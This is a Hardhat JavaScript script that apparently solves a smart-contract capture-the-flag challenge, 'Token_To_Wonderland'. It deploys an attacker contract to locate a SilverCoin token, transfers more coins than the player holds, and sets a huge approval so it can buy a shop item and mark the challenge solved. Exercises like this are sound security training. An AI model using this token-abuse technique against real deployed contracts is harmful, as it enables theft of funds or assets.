const hre = require("hardhat");
const { ethers, JsonRpcProvider } = require("ethers");

async function main() {

    const [deployer] = await hre.ethers.getSigners();

    const SETUP_ADDRESS = "0x3aB81F01D41a49cD1AED7f2bF8EDfc6aFeb74bF1";
    const PLAYER_ADDRESS = "0xE3719059d3C66Ba54886DcD108fa294fD158B0b4";
    //const shopAddress = "0x05BFaB88aFA6a549f0E1Ac1a1468125551bBd971";

    // Get the contract instances
    const Setup = await hre.ethers.getContractFactory("contracts/Token_To_Wonderland/Setup.sol:Setup");
    const setupInstance = Setup.attach(SETUP_ADDRESS);

    // Interact with the Setup contract
    const shopAddress = await setupInstance.TARGET();
    console.log(`Target Shop Address: ${shopAddress}`);

    // Assuming Creature ABI is available
    const Shop = await hre.ethers.getContractFactory("contracts/Token_To_Wonderland/Shop.sol:Shop");
    const shopInstance = Shop.attach(shopAddress);

    //Attacker contract
    const AttackerContract = await hre.ethers.getContractFactory("contracts/Token_To_Wonderland/Solution/GetCoinAddress.sol:Attack");
    const attackerContractInstance = await AttackerContract.deploy();

    const COIN_ADDRESS = await attackerContractInstance.getContractAddress(await setupInstance.getAddress());
    console.log("COIN ADDRESS: ", COIN_ADDRESS)
    const Coin = await hre.ethers.getContractFactory("contracts/Token_To_Wonderland/SilverCoin.sol:SilverCoin")
    const coinInstance = await Coin.attach(COIN_ADDRESS);

    console.log("Initial Balance should be 100: ", await coinInstance.balanceOf(PLAYER_ADDRESS));
    console.log("SHOP Allowance: ", await coinInstance.balanceOf(setupInstance.getAddress()));

    await coinInstance.transfer(PLAYER_ADDRESS, 101);
    const success = await coinInstance.approve(shopInstance.getAddress(), hre.ethers.parseEther("25000000"));
    await shopInstance.buyItem(2);

    console.log("Post Transfer Balance: ", await coinInstance.balanceOf(PLAYER_ADDRESS));

    console.log(`isSolved?: ${await setupInstance.isSolved(PLAYER_ADDRESS)}`);
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });